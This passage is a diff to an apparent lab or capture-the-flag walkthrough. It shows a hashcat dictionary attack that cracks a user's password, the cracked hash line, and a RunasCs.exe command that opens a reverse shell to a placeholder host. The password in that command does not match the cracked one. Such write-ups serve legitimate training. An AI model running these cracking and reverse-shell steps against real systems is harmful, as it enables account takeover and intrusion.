@@ -272,13 +272,13 @@ We run:
 hashcat -a 0 -m 10900 hashes.txt rockyou.txt --show
 ```
 
-Which yields:
+Which yields`12345678` as Emily's password:
 
 ```
 sha256:50000:In2HPMqJEDzYOpdr2sUkhg==:l5BygNwk/lF8Q0db0hi/rVbCXU0RA32LbaRA79TWka3+rUAzCyqmqvHzNiHQ1zIo/BY=:12345678
 ```
 
-as Emily's password. Emily cannot log in remotely, so we use `RunasCs.exe` to catch a shell as Emily from our non-interactive shell.
+Emily cannot log in remotely, so we use `RunasCs.exe` to catch a shell as Emily from our non-interactive shell.
 
 ```bash
 .\RunasCs.exe Emily 12345679 bash -r ip:port
